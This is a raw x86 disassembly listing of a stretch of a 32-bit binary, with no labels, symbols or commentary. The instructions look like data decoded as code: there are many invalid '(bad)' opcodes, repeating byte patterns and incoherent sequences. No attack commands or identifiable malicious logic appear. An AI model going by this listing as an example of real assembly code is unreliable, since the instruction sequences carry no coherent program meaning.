  41ac73:	test   BYTE PTR [eax+0x0],al
  41ac76:	bound  ebx,QWORD PTR [eax+0x62]
  41ac79:	inc    ecx
  41ac7a:	inc    eax
  41ac7b:	mov    al,ds:0x14156868
  41ac80:	popa   
  41ac81:	cmp    ebp,DWORD PTR [edx-0x349db7f3]
  41ac87:	inc    eax
  41ac88:	cmp    al,0x8
  41ac8a:	(bad)
  41ac8d:	pop    edi
  41ac8e:	dec    eax
  41ac8f:	sbb    BYTE PTR [edx+0x2b],ah
  41ac92:	adc    BYTE PTR [edx+0x40],ah
  41ac95:	inc    ecx
  41ac96:	and    eax,0x40000500
  41ac9b:	inc    ebx
  41ac9c:	add    eax,0x40624041
  41aca1:	inc    ebx
  41aca2:	add    eax,0x43402541
  41aca7:	bound  eax,QWORD PTR [eax+0x43]
  41acaa:	int3   
  41acab:	inc    eax
  41acac:	bound  eax,QWORD PTR [eax]
  41acae:	inc    ecx
  41acaf:	inc    eax
  41acb0:	inc    eax
  41acb1:	add    eax,0xbf614105
  41acb6:	in     al,0x31
  41acb8:	inc    eax
  41acb9:	sub    eax,0xd46ee17
  41acbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acbf:	mov    ah,0x14
  41acc1:	inc    eax
  41acc2:	push   edx
  41acc3:	inc    esp
  41acc4:	xchg   ebx,eax
  41acc5:	retf   0x63e0
  41acc8:	inc    eax
  41acc9:	das    
  41acca:	addr16 sub al,0x20
  41accd:	inc    edx
  41acce:	bound  esp,QWORD PTR [esi]
  41acd0:	outs   dx,BYTE PTR ds:[esi]
  41acd1:	clc    
  41acd2:	inc    edx
  41acd3:	test   al,0x60
  41acd5:	inc    esi
  41acd6:	test   eax,0x23434088
  41acdb:	pop    edi
  41acdc:	bound  eax,QWORD PTR [eax+0x25]
  41acdf:	add    BYTE PTR [esi+0x40],ah
  41ace2:	add    eax,0x40404143
  41ace7:	inc    ebx
  41ace8:	add    BYTE PTR [eax],al
  41acea:	add    BYTE PTR [edx-0x34],ah
  41aced:	inc    eax
  41acee:	add    eax,0x40004041
  41acf3:	inc    ecx
  41acf4:	int3   
  41acf5:	add    BYTE PTR [ebx-0x7c],al
  41acf8:	add    eax,0x5406240
  41acfd:	bound  ebp,QWORD PTR [esp+ebp*8]
  41ad00:	lods   al,BYTE PTR ds:[esi]
  41ad01:	inc    edx
  41ad02:	push   cs
  41ad03:	arpl   WORD PTR [edi],ax
  41ad05:	(bad)  
  41ad06:	lock inc ecx
  41ad08:	addr16 xor al,0x40
  41ad0b:	dec    eax
  41ad0c:	jmp    0xc6526d55
  41ad11:	(bad)  
  41ad12:	punpcklwd mm2,DWORD PTR [eax+0x2c]
  41ad16:	inc    esp
  41ad17:	enter  0x6462,0x40
  41ad1b:	inc    ecx
  41ad1c:	das    
  41ad1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad1e:	cs push ecx
  41ad20:	(bad)  
  41ad21:	cmp    DWORD PTR [ecx],ecx
  41ad23:	and    DWORD PTR [ebp+ecx*8-0x36],ecx
  41ad27:	retf   0x4638
  41ad2a:	inc    eax
  41ad2b:	ins    DWORD PTR es:[edi],dx
  41ad2c:	out    0x40,al
  41ad2e:	bound  ebx,QWORD PTR [eax+0x41]
  41ad31:	add    eax,0x40404340
  41ad36:	inc    ebx
  41ad37:	inc    eax
  41ad38:	test   BYTE PTR [eax],al
  41ad3a:	add    eax,0x40624041
  41ad3f:	inc    eax
  41ad40:	add    BYTE PTR [edx+0x5],ah
  41ad43:	inc    ebx
  41ad44:	add    BYTE PTR [eax+0x78],al
  41ad47:	inc    ecx
  41ad48:	add    BYTE PTR [eax+0x41],bl
  41ad4b:	bound  eax,QWORD PTR [ecx-0x8]
  41ad4e:	mov    eax,0x61143c58
  41ad53:	outs   dx,DWORD PTR ds:[esi]
  41ad54:	out    dx,al
  41ad55:	fisttp QWORD PTR ds:0x56404c9c
  41ad5b:	dec    esp
  41ad5c:	inc    esp
  41ad5d:	adc    DWORD PTR [ebx+0x60],eax
  41ad60:	sub    BYTE PTR [ebx],al
  41ad62:	loope  0x41ad87
  41ad64:	sub    al,0xac
  41ad66:	inc    ebp
  41ad67:	stc    
  41ad68:	inc    eax
  41ad69:	inc    eax
  41ad6a:	inc    ebp
  41ad6b:	adc    esp,DWORD PTR [esi+edi*8+0x15c6dd53]
  41ad72:	inc    eax
  41ad73:	test   BYTE PTR [eax],al
  41ad75:	int3   
  41ad76:	bound  eax,QWORD PTR ds:0xcc840f41
  41ad7c:	inc    ebx
  41ad7d:	add    BYTE PTR [eax+0x0],al
  41ad80:	inc    eax
  41ad81:	inc    eax
  41ad82:	inc    eax
  41ad83:	int3   
  41ad84:	add    BYTE PTR ds:0x62404341,al
  41ad8a:	pop    eax
  41ad8b:	add    BYTE PTR [ebx+0x40],al
  41ad8e:	bound  ecx,QWORD PTR [edi]
  41ad90:	inc    eax
  41ad91:	and    al,0x22
  41ad93:	dec    ebp
  41ad94:	sub    bh,BYTE PTR [edx+esi*1+0x69]
  41ad98:	inc    eax
  41ad99:	and    edi,DWORD PTR [ebx+0x5852058d]
  41ad9f:	fcom   QWORD PTR [edx]
  41ada1:	inc    ebx
  41ada2:	jg     0x41ade8
  41ada4:	retf   
  41ada5:	inc    ebx
  41ada6:	push   0x1d
  41ada8:	inc    eax
  41ada9:	mov    al,ds:0x4122c48
  41adae:	inc    esp
  41adaf:	add    BYTE PTR [eax],al
  41adb1:	inc    eax
  41adb2:	inc    eax
  41adb3:	cmovno eax,DWORD PTR ds:0x40056243
  41adba:	int3   
  41adbb:	add    ah,cl
  41adbd:	inc    eax
  41adbe:	inc    eax
  41adbf:	bound  eax,QWORD PTR [ecx+0x0]
  41adc2:	add    BYTE PTR [edi],cl
  41adc4:	inc    ebx
  41adc5:	inc    eax
  41adc6:	inc    eax
  41adc7:	add    BYTE PTR [ecx+0x43],al
  41adca:	add    eax,0x40256240
  41adcf:	bound  eax,QWORD PTR [eax]
  41add1:	rcl    DWORD PTR [edi*4+0x52a0a220],0x18
  41add9:	inc    esi
  41adda:	inc    eax
  41addb:	cs and eax,0xed1041d5
  41ade1:	and    al,0x13
  41ade3:	sub    al,0x76
  41ade5:	bound  ebp,QWORD PTR [eax]
  41ade7:	test   BYTE PTR [ebx-0x48],dl
  41adea:	inc    eax
  41adeb:	jmp    DWORD PTR [edx-0x50adcf12]
  41adf1:	add    eax,0x4140cc00
  41adf6:	inc    eax
  41adf7:	inc    ebx
  41adf8:	bound  esp,QWORD PTR ds:0x41400043
  41adfe:	add    BYTE PTR [eax],al
  41ae00:	add    eax,0x43624062
  41ae05:	inc    ecx
  41ae06:	inc    eax
  41ae07:	inc    eax
  41ae08:	inc    eax
  41ae09:	add    eax,0x40624340
  41ae0e:	add    eax,0x40664140
  41ae13:	add    DWORD PTR [esi],ecx
  41ae15:	aas    
  41ae16:	es inc esp
  41ae18:	add    al,0x41
  41ae1a:	cdq    
  41ae1b:	adc    al,0x40
  41ae1d:	mov    eax,ds:0x11342ccf
  41ae22:	sub    ecx,ecx
  41ae24:	or     DWORD PTR ds:0xcabfa0a1,ebp
  41ae2a:	bound  esp,QWORD PTR [esi]
  41ae2c:	inc    eax
  41ae2d:	mov    ds:0xb8b84d61,eax
  41ae32:	sbb    DWORD PTR [eax-0x72dedde1],edi
  41ae38:	ret    
  41ae39:	inc    ecx
  41ae3a:	clc    
  41ae3b:	or     eax,0x44572240
  41ae40:	xchg   ecx,eax
  41ae41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae42:	push   0xa0211444
  41ae47:	sub    al,0x43
  41ae49:	xor    BYTE PTR [eax+eax*8+0x40],bh
  41ae4d:	push   esp
  41ae4e:	pop    ss
  41ae4f:	inc    ebx
  41ae50:	add    BYTE PTR ds:0x41107840,al
  41ae56:	bound  eax,QWORD PTR [eax+0x40]
  41ae59:	sldt   WORD PTR [eax-0x34]
  41ae5d:	js     0x41aec1
  41ae5f:	add    eax,0x40664143
  41ae64:	inc    ebx
  41ae65:	add    BYTE PTR [ecx+0x5],al
  41ae68:	js     0x41aeaa
  41ae6a:	bound  eax,QWORD PTR [eax+0x0]
  41ae6d:	inc    eax
  41ae6e:	sahf   
  41ae6f:	dec    esp
  41ae70:	retf   
  41ae71:	bound  esi,QWORD PTR [eax+edx*1+0x21]
  41ae75:	pusha  
  41ae76:	(bad)
  41ae79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae7a:	bound  eax,QWORD PTR [eax+0x40]
  41ae7d:	addr16 enterw 0x873c,0x92
  41ae83:	sbb    DWORD PTR [ebx-0x77bc011f],esp
  41ae89:	push   ebp
  41ae8a:	jae    0x41aecc
  41ae8c:	cmp    eax,DWORD PTR [edx+0x44]
  41ae8f:	sub    DWORD PTR [ebx+0x65],edi
  41ae92:	xchg   ecx,eax
  41ae93:	adc    cl,BYTE PTR [eax+0x60]
  41ae96:	inc    ecx
  41ae97:	inc    ebx
  41ae98:	inc    eax
  41ae99:	inc    eax
  41ae9a:	add    eax,0x434162
  41ae9f:	inc    eax
  41aea0:	add    BYTE PTR [edx+0x5],ah
  41aea3:	inc    eax
  41aea4:	adc    BYTE PTR [edx+0x40],ah
  41aea7:	inc    ebx
  41aea8:	inc    ecx
  41aea9:	add    eax,0x4340
  41aeae:	add    eax,0x404162
  41aeb3:	add    BYTE PTR [eax+0x43],al
  41aeb6:	inc    eax
  41aeb7:	add    eax,0xb841ee2c
  41aebc:	fs inc eax
  41aebe:	and    BYTE PTR [esp+ebx*4],ah
  41aec1:	add    ch,BYTE PTR ds:[ebp-0x35]
  41aec5:	add    esp,DWORD PTR ds:0xfec1d56c
  41aecb:	xchg   ecx,eax
  41aecc:	enter  0x2340,0x21
  41aed0:	push   edi
  41aed1:	lds    eax,FWORD PTR [ebp+0x63]
  41aed4:	retf   
  41aed5:	add    eax,0x40d821
  41aeda:	add    BYTE PTR [ecx+0x43],al
  41aedd:	add    eax,0x41784062
  41aee2:	inc    eax
  41aee3:	inc    eax
  41aee4:	add    BYTE PTR [edi],cl
  41aee6:	bound  eax,QWORD PTR [ebx+0x0]
  41aee9:	add    eax,0x25006240
  41aeee:	inc    eax
  41aeef:	add    eax,0x40254143
  41aef4:	add    eax,0xfe620000
  41aef9:	xor    cl,dl
  41aefb:	push   edi
  41aefc:	mov    edi,0x44223c40
  41af01:	inc    edx
  41af02:	test   BYTE PTR [edi-0x41],ch
  41af05:	add    al,0xe6
  41af07:	xor    BYTE PTR [edx+ebp*1],ch
  41af0a:	push   edx
  41af0b:	xchg   ebp,eax
  41af0c:	test   al,0x40
  41af0e:	xor    BYTE PTR [eax-0x66],al
  41af11:	and    BYTE PTR [eax],bl
  41af13:	arpl   si,di
  41af15:	inc    eax
  41af16:	sub    BYTE PTR [ecx+0x712834cd],ah
  41af1c:	inc    ebx
  41af1d:	inc    eax
  41af1e:	mov    ds:0x5280252d,al
  41af23:	fs sbb eax,0x43
  41af29:	inc    ecx
  41af2a:	inc    eax
  41af2b:	bound  esp,QWORD PTR [esi+0x0]
  41af2e:	inc    eax
  41af2f:	add    eax,0x5400000
  41af34:	inc    ecx
  41af35:	inc    eax
  41af36:	inc    eax
  41af37:	bound  esp,QWORD PTR ds:0x25050043
  41af3d:	inc    ecx
  41af3e:	inc    ebx
  41af3f:	inc    eax
  41af40:	test   BYTE PTR [eax+0x0],al
  41af43:	bound  ebx,QWORD PTR [eax+0x62]
  41af46:	inc    ecx
  41af47:	inc    eax
  41af48:	and    al,0x29
  41af4a:	inc    esp
  41af4b:	outs   dx,BYTE PTR ds:[esi]
  41af4c:	vrsqrtss xmm5,xmm0,DWORD PTR [eax+eax*2+0x5e]
  41af52:	bound  esp,QWORD PTR [edx+edx*4+0x4f]
  41af56:	shl    BYTE PTR [edx+0x40],0x20
  41af5a:	and    DWORD PTR [esp+eax*2-0x48],eax
  41af5e:	dec    esp
  41af5f:	fs inc eax
  41af61:	cmc    
  41af62:	adc    BYTE PTR [edx+0x40],ah
  41af65:	inc    ecx
  41af66:	and    eax,0x40000500
  41af6b:	inc    ebx
  41af6c:	add    eax,0x40624041
  41af71:	inc    ebx
  41af72:	add    eax,0x43402541
  41af77:	bound  eax,QWORD PTR [eax+0x43]
  41af7a:	int3   
  41af7b:	inc    eax
  41af7c:	bound  eax,QWORD PTR [eax]
  41af7e:	inc    ecx
  41af7f:	inc    eax
  41af80:	inc    eax
  41af81:	add    eax,0x202c4e05
  41af86:	inc    edx
  41af87:	cmp    DWORD PTR [eax],ebp
  41af89:	and    esp,DWORD PTR [eax+0x20]
  41af8c:	cwde   
  41af8d:	enter  0x7bfb,0x48
  41af91:	inc    eax
  41af92:	mov    dh,0x17
  41af94:	lds    edi,FWORD PTR [ebp+0x53]
  41af97:	or     ebp,DWORD PTR [eax]
  41af99:	inc    eax
  41af9a:	xchg   ecx,eax
  41af9b:	inc    esi
  41af9c:	dec    edx
  41af9d:	cmp    BYTE PTR [edx],cl
  41af9f:	in     eax,0xac
  41afa1:	inc    eax
  41afa2:	inc    eax
  41afa3:	loope  0x41af93
  41afa5:	xor    esp,DWORD PTR fs:[edx+0x40]
  41afa9:	and    eax,0x5406600
  41afae:	inc    ebx
  41afaf:	inc    ecx
  41afb0:	inc    eax
  41afb1:	inc    eax
  41afb2:	inc    ebx
  41afb3:	add    BYTE PTR [eax],al
  41afb5:	add    BYTE PTR [edx-0x34],ah
  41afb8:	inc    eax
  41afb9:	add    eax,0x40004041
  41afbe:	inc    ecx
  41afbf:	int3   
  41afc0:	add    BYTE PTR [ebx-0x7c],al
  41afc3:	add    eax,0x5406240
  41afc8:	bound  esp,QWORD PTR [edx+0x5]
  41afcb:	and    al,BYTE PTR [esp+edx*1]
  41afce:	inc    esp
  41afcf:	mov    DWORD PTR [eax+0x7040c9f7],esi
  41afd5:	mov    eax,ds:0x4f15a82c
  41afda:	inc    edx
  41afdb:	inc    eax
  41afdc:	inc    eax
  41afdd:	jbe    0x41af75
  41afdf:	adc    DWORD PTR [eax+0x62],eax
  41afe2:	pop    eax
  41afe3:	inc    ecx
  41afe4:	add    eax,0x40404340
  41afe9:	inc    ebx
  41afea:	inc    eax
  41afeb:	test   BYTE PTR [eax],al
  41afed:	add    eax,0x40624041
  41aff2:	inc    eax
  41aff3:	add    BYTE PTR [edx+0x5],ah
  41aff6:	inc    ebx
  41aff7:	add    BYTE PTR [eax+0x78],al
  41affa:	inc    ecx
  41affb:	add    BYTE PTR [eax+0x41],bl
  41affe:	bound  edi,QWORD PTR [ebx+0x36]
  41b001:	inc    esp
  41b002:	inc    eax
  41b003:	add    BYTE PTR [ebx-0x2b],ah
  41b006:	mov    eax,0x21f0b2b8
  41b00b:	js     0x41b04d
  41b00d:	inc    edi
  41b00e:	inc    edx
  41b00f:	adc    eax,0x40402264
  41b014:	pusha  
  41b015:	out    dx,al
  41b016:	popa   
  41b017:	retf   
  41b018:	sbb    eax,DWORD PTR [eax+eax*2+0x63]
  41b01c:	out    dx,eax
  41b01d:	inc    esp
  41b01e:	hlt    
  41b01f:	inc    ebp
  41b020:	jl     0x41aff3
  41b022:	inc    eax
  41b023:	sub    BYTE PTR [ebx],dh
  41b025:	sub    al,0x65
  41b027:	scas   al,BYTE PTR es:[edi]
  41b028:	bound  esp,QWORD PTR ds:0x94564050
  41b02e:	test   BYTE PTR [eax],dh
  41b030:	jae    0x41b052
  41b032:	inc    eax
  41b033:	jp     0x41b075
  41b035:	test   BYTE PTR [eax],al
  41b037:	int3   
  41b038:	bound  eax,QWORD PTR ds:0xcc840f41
  41b03e:	inc    ebx
  41b03f:	add    BYTE PTR [eax+0x0],al
  41b042:	inc    eax
  41b043:	inc    eax
  41b044:	inc    eax
  41b045:	int3   
  41b046:	add    BYTE PTR ds:0x62404341,al
  41b04c:	pop    eax
  41b04d:	add    BYTE PTR [ebx+0x40],al
  41b050:	bound  ecx,QWORD PTR [edi]
  41b052:	inc    eax
  41b053:	loopne 0x41b09d
  41b055:	adc    eax,0x4046acf4
  41b05a:	inc    esp
  41b05b:	sub    al,0x9d
  41b05d:	retf   
  41b05e:	shl    BYTE PTR [edx-0x38],0x40
  41b062:	add    cl,BYTE PTR ds:0x93621144
  41b068:	add    BYTE PTR [eax+eax*1+0x0],al
  41b06c:	inc    eax
  41b06d:	inc    eax
  41b06e:	cmovno eax,DWORD PTR ds:0x40056243
  41b075:	int3   
  41b076:	add    ah,cl
  41b078:	inc    eax
  41b079:	inc    eax
  41b07a:	bound  eax,QWORD PTR [ecx+0x0]
  41b07d:	add    BYTE PTR [edi],cl
  41b07f:	inc    ebx
  41b080:	inc    eax
  41b081:	inc    eax
  41b082:	add    BYTE PTR [ecx+0x43],al
  41b085:	add    eax,0x40256240
  41b08a:	bound  eax,QWORD PTR [eax]
  41b08c:	sub    al,0xe1
  41b08e:	sub    al,0xb4
  41b090:	inc    ebx
  41b091:	mov    ah,0xd4
  41b093:	inc    eax
  41b094:	fwait
  41b095:	push   0xffffff92
  41b097:	inc    edx
  41b098:	jl     0x41b0fc
  41b09a:	ss inc eax
  41b09c:	and    DWORD PTR [esi-0x3b],0x1c255377
  41b0a3:	inc    eax
  41b0a4:	mov    ah,0x7c
  41b0a6:	pop    esp
  41b0a7:	xor    BYTE PTR [eax-0x7abc22d0],dh
  41b0ad:	inc    edx
  41b0ae:	out    dx,al
  41b0af:	bound  ecx,QWORD PTR ds:0x58401062
  41b0b5:	pusha  
  41b0b6:	dec    ebp
  41b0b7:	test   bl,cl
  41b0b9:	adc    eax,0x22004042
  41b0be:	sub    al,0x5
  41b0c0:	and    al,0xcd
  41b0c2:	push   es
  41b0c3:	inc    eax
  41b0c4:	das    
  41b0c5:	sbb    dl,BYTE PTR [eax-0x33fffa37]
  41b0cb:	inc    eax
  41b0cc:	inc    ecx
  41b0cd:	inc    eax
  41b0ce:	inc    ebx
  41b0cf:	bound  esp,QWORD PTR ds:0x41400043
  41b0d5:	add    BYTE PTR [eax],al
  41b0d7:	add    eax,0x43624062
  41b0dc:	inc    ecx
  41b0dd:	inc    eax
  41b0de:	inc    eax
  41b0df:	inc    eax
  41b0e0:	add    eax,0x40624340
  41b0e5:	add    eax,0x40664140
  41b0ea:	adc    BYTE PTR ss:[edx+eax*2],al
  41b0ee:	outs   dx,BYTE PTR ds:[esi]
  41b0ef:	jne    0x41b0c6
  41b0f1:	nop
  41b0f2:	inc    edx
  41b0f3:	ss int 0x40
  41b0f6:	dec    esp
  41b0f7:	arpl   sp,cx
  41b0f9:	add    eax,0x40427636
  41b0fe:	xor    BYTE PTR [edi+0x32],0xcb
  41b102:	cld    
  41b103:	push   0xeb604041
  41b108:	fs nop
  41b10a:	arpl   WORD PTR [ebp-0xc],sp
  41b10d:	inc    ecx
  41b10e:	stos   DWORD PTR es:[edi],eax
  41b10f:	inc    eax
  41b110:	inc    esp
  41b111:	inc    esp
  41b112:	daa    
  41b113:	adc    bh,al
  41b115:	inc    eax
  41b116:	test   DWORD PTR ds:0x7bb46c2c,esp
  41b11c:	test   al,0x40
  41b11e:	fadd   QWORD PTR [ebx+0x0]
  41b121:	add    eax,0x41107840
  41b126:	bound  eax,QWORD PTR [eax+0x40]
  41b129:	sldt   WORD PTR [eax-0x34]
  41b12d:	js     0x41b191
  41b12f:	add    eax,0x40664143
  41b134:	inc    ebx
  41b135:	add    BYTE PTR [ecx+0x5],al
  41b138:	js     0x41b17a
  41b13a:	bound  eax,QWORD PTR [eax+0x0]
  41b13d:	inc    eax
  41b13e:	mov    gs,WORD PTR [bx+si]
  41b141:	arpl   cx,di
  41b143:	adc    al,BYTE PTR [eax-0x80]
  41b146:	and    ch,cl
  41b148:	arpl   dx,ax
  41b14a:	inc    edx
  41b14b:	mov    eax,0x4e027a41
  41b150:	push   esp
  41b151:	xchg   esp,eax
  41b152:	mov    al,0x15
  41b154:	inc    eax
  41b155:	inc    ebp
  41b156:	push   edx
  41b157:	(bad)  
  41b158:	ins    BYTE PTR es:[edi],dx
  41b159:	and    eax,0x40cbf4
  41b15e:	and    BYTE PTR [ecx+ebp*1-0x71],al
  41b162:	arpl   WORD PTR [ecx+0x43],ax
  41b165:	inc    eax
  41b166:	inc    eax
  41b167:	add    eax,0x434162
  41b16c:	inc    eax
  41b16d:	add    BYTE PTR [edx+0x5],ah
  41b170:	inc    eax
  41b171:	adc    BYTE PTR [edx+0x40],ah
  41b174:	inc    ebx
  41b175:	inc    ecx
  41b176:	add    eax,0x4340
  41b17b:	add    eax,0x404162
  41b180:	add    BYTE PTR [eax+0x43],al
  41b183:	inc    eax
  41b184:	add    eax,0xf3a40b0
  41b189:	sub    al,0x62
  41b18b:	test   al,0x79
  41b18d:	retf   
  41b18e:	inc    ebx
  41b18f:	mov    WORD PTR [edi],?
  41b191:	mov    WORD PTR [eax+0x404463f9],ss
  41b197:	xor    BYTE PTR [ebp-0x3b],0xd
  41b19b:	push   edi
  41b19c:	xor    DWORD PTR [esi+0x40],eax
  41b19f:	cmc    
  41b1a0:	mov    dh,0x47
  41b1a2:	leave  
  41b1a3:	push   ebx
  41b1a4:	inc    ebx
  41b1a5:	inc    edx
  41b1a6:	inc    eax
  41b1a7:	ins    DWORD PTR es:[edi],dx
  41b1a8:	adc    ch,dh
  41b1aa:	test   al,0x48
  41b1ac:	std    
  41b1ad:	sub    al,0x40
  41b1af:	out    dx,eax
  41b1b0:	std    
  41b1b1:	clc    
  41b1b2:	or     eax,0x40676b
  41b1b7:	add    BYTE PTR [ecx+0x43],al
  41b1ba:	add    eax,0x41784062
  41b1bf:	inc    eax
  41b1c0:	inc    eax
  41b1c1:	add    BYTE PTR [edi],cl
  41b1c3:	bound  eax,QWORD PTR [ebx+0x0]
  41b1c6:	add    eax,0x25006240
  41b1cb:	inc    eax
  41b1cc:	add    eax,0x40254143
  41b1d1:	add    eax,0x3b620000
  41b1d6:	xor    BYTE PTR [edx+edx*1],al
  41b1d9:	adc    ebx,ecx
  41b1db:	icebp  
  41b1dc:	push   cs
  41b1dd:	aad    0xea
  41b1df:	jmp    DWORD PTR es:0x5b9c6348
  41b1e6:	je     0x41b22d
  41b1e8:	dec    edi
  41b1e9:	bound  esi,QWORD PTR [ebx]
  41b1eb:	inc    ebp
  41b1ec:	push   ebx
  41b1ed:	cs std 
  41b1ef:	add    DWORD PTR [ecx-0x76c7572b],ebp
  41b1f5:	ret    0xf3f7
  41b1f8:	add    eax,0x43d50542
  41b1fd:	add    BYTE PTR [eax],al
  41b1ff:	add    BYTE PTR [ecx+0x40],al
  41b202:	bound  esp,QWORD PTR [esi+0x0]
  41b205:	inc    eax
  41b206:	add    eax,0x5400000
  41b20b:	inc    ecx
  41b20c:	inc    eax
  41b20d:	inc    eax
  41b20e:	bound  esp,QWORD PTR ds:0x25050043
  41b214:	inc    ecx
  41b215:	inc    ebx
  41b216:	inc    eax
  41b217:	test   BYTE PTR [eax+0x0],al
  41b21a:	bound  ebx,QWORD PTR [eax+0x62]
  41b21d:	inc    ecx
  41b21e:	inc    eax
  41b21f:	in     eax,0x74
  41b221:	retf   0xf182
  41b224:	std    
  41b225:	jns    0x41b1eb
  41b227:	bound  eax,QWORD PTR gs:[eax-0x43bbbfc7]
  41b22e:	dec    edi
  41b22f:	bound  ebx,QWORD PTR [ebx+0x2c269249]
  41b235:	add    eax,0x711e6c40
  41b23a:	add    DWORD PTR [eax+ecx*4+0x6b],esi
  41b23e:	mov    ah,0x28
  41b240:	xor    eax,0xcd406aec
  41b245:	push   esp
  41b246:	inc    edx
  41b247:	(bad)  
  41b248:	dec    eax
  41b249:	add    eax,0x5450601
  41b24e:	std    
  41b24f:	lds    ebx,FWORD PTR [esi+0x49]
  41b252:	adc    BYTE PTR [edx+0x40],ah
  41b255:	inc    ecx
  41b256:	and    eax,0x40000500
  41b25b:	inc    ebx
  41b25c:	add    eax,0x40624041
  41b261:	inc    ebx
  41b262:	add    eax,0x43402541
  41b267:	bound  eax,QWORD PTR [eax+0x43]
  41b26a:	int3   
  41b26b:	inc    eax
  41b26c:	bound  eax,QWORD PTR [eax]
  41b26e:	inc    ecx
  41b26f:	inc    eax
  41b270:	inc    eax
  41b271:	add    eax,0xfeb81b05
  41b276:	retf   
  41b277:	pusha  
  41b278:	dec    edi
  41b279:	and    edi,eax
  41b27b:	dec    edx
  41b27c:	or     al,BYTE PTR [esi+ecx*2+0x67]
  41b280:	ins    BYTE PTR es:[edi],dx
  41b281:	fld    QWORD PTR [edx]
  41b283:	adc    BYTE PTR [ebx],0x2c
  41b286:	cmp    al,0xb4
  41b288:	(bad)  
  41b289:	jns    0x41b249
  41b28b:	xor    al,0x3a
  41b28d:	xchg   BYTE PTR [edi+edx*2+0x62],bh
  41b291:	test   al,0x41
  41b293:	fs xchg ebp,eax
  41b296:	bound  ecx,QWORD PTR [ecx+0x140106e]
  41b29c:	sbb    eax,0xe0f4c441
  41b2a1:	xchg   esp,eax
  41b2a2:	inc    eax
  41b2a3:	frstor [edx+0x40]
  41b2a6:	and    eax,0x5406600
  41b2ab:	inc    ebx
  41b2ac:	inc    ecx
  41b2ad:	inc    eax
  41b2ae:	inc    eax
  41b2af:	inc    ebx
  41b2b0:	add    BYTE PTR [eax],al
  41b2b2:	add    BYTE PTR [edx-0x34],ah
  41b2b5:	inc    eax
  41b2b6:	add    eax,0x40004041
  41b2bb:	inc    ecx
  41b2bc:	int3   
  41b2bd:	add    BYTE PTR [ebx-0x7c],al
  41b2c0:	add    eax,0x5406240
  41b2c5:	bound  eax,QWORD PTR [ebx]
  41b2c7:	into   
  41b2c8:	dec    edi
  41b2c9:	inc    edi
  41b2ca:	push   edx
  41b2cb:	add    eax,0x71098140
  41b2d0:	mov    edi,0x4ccd566f
  41b2d5:	pusha  
  41b2d6:	mov    eax,edi
  41b2d8:	mov    eax,0x404438aa
  41b2dd:	add    DWORD PTR [eax-0x13],ecx
  41b2e0:	ret    
  41b2e1:	mov    ch,0xe9
  41b2e3:	pusha  
  41b2e4:	inc    eax
  41b2e5:	fiadd  WORD PTR ds:0xe2f0923e
  41b2eb:	and    BYTE PTR [eax-0x7f],al
  41b2ee:	add    esp,DWORD PTR [edx-0x41]
  41b2f1:	es test al,0xaa
  41b2f4:	pop    eax
  41b2f5:	dec    edx
  41b2f6:	test   BYTE PTR [eax+0x44],cl
  41b2f9:	iret   
  41b2fa:	inc    eax
  41b2fb:	bound  ebx,QWORD PTR [eax+0x41]
  41b2fe:	add    eax,0x40404340
  41b303:	inc    ebx
  41b304:	inc    eax
  41b305:	test   BYTE PTR [eax],al
  41b307:	add    eax,0x40624041
  41b30c:	inc    eax
  41b30d:	add    BYTE PTR [edx+0x5],ah
  41b310:	inc    ebx
  41b311:	add    BYTE PTR [eax+0x78],al
  41b314:	inc    ecx
  41b315:	add    BYTE PTR [eax+0x41],bl
  41b318:	bound  edx,QWORD PTR [eax]
  41b31a:	sub    al,BYTE PTR [eax+0x4]
  41b31d:	xor    ah,bh
  41b31f:	add    eax,0x40adbcbd
  41b324:	jl     0x41b311
  41b326:	je     0x41b328
  41b328:	bound  eax,QWORD PTR ds:0x82fe4063
  41b32e:	inc    esp
  41b32f:	bound  ebp,QWORD PTR [eax-0x9]
  41b332:	test   al,0x54
  41b334:	jae    0x41b2f3
  41b336:	sub    eax,0xcc008440
  41b33b:	bound  eax,QWORD PTR ds:0xcc840f41
  41b341:	inc    ebx
  41b342:	add    BYTE PTR [eax+0x0],al
  41b345:	inc    eax
  41b346:	inc    eax
  41b347:	inc    eax
  41b348:	int3   
  41b349:	add    BYTE PTR ds:0x62404341,al
  41b34f:	pop    eax
  41b350:	add    BYTE PTR [ebx+0x40],al
  41b353:	bound  ecx,QWORD PTR [edi]
  41b355:	inc    eax
  41b356:	dec    edi
  41b357:	enter  0x464f,0x40
  41b35b:	(bad)  
  41b35c:	ins    DWORD PTR es:[edi],dx
  41b35d:	or     al,0x62
  41b360:	inc    ebp
  41b361:	mov    ch,0x40
  41b363:	inc    ebp
  41b364:	dec    edx
  41b365:	int    0x53
  41b367:	xchg   DWORD PTR [edi],esi
  41b369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b36a:	inc    eax
  41b36b:	mov    es,WORD PTR [ecx]
  41b36d:	inc    edi
  41b36e:	dec    edi
  41b36f:	(bad)  
  41b370:	aam    0x15
  41b372:	push   eax
  41b373:	ss inc esi
  41b375:	out    dx,al
  41b376:	leave  
  41b377:	push   ebp
  41b378:	bound  eax,QWORD PTR [ecx+0x40]
  41b37b:	(bad)  
  41b37c:	add    BYTE PTR [eax+edx*1+0x63],al
  41b380:	adc    edx,eax
  41b382:	inc    eax
  41b383:	add    DWORD PTR [edx],esi
  41b385:	sub    al,0x98
  41b387:	shr    DWORD PTR [eax+0x444016],cl
  41b38d:	add    BYTE PTR [eax+0x40],al
  41b390:	cmovno eax,DWORD PTR ds:0x40056243
  41b397:	int3   
  41b398:	add    ah,cl
  41b39a:	inc    eax
  41b39b:	inc    eax
  41b39c:	bound  eax,QWORD PTR [ecx+0x0]
  41b39f:	add    BYTE PTR [edi],cl
  41b3a1:	inc    ebx
  41b3a2:	inc    eax
  41b3a3:	inc    eax
  41b3a4:	add    BYTE PTR [ecx+0x43],al
  41b3a7:	add    eax,0x40256240
  41b3ac:	bound  eax,QWORD PTR [eax]
  41b3ae:	push   ebx
  41b3af:	xor    BYTE PTR [edi],0xfc
  41b3b2:	or     eax,0x814cfa
  41b3b7:	push   ecx
  41b3b8:	ds add eax,0x6e40a4cd
  41b3be:	sub    eax,0x41404b9d
  41b3c3:	or     eax,0x44489940
  41b3c8:	inc    esp
  41b3c9:	inc    esp
  41b3ca:	adc    eax,0x85514041
  41b3cf:	sub    al,0x6a
  41b3d1:	push   eax
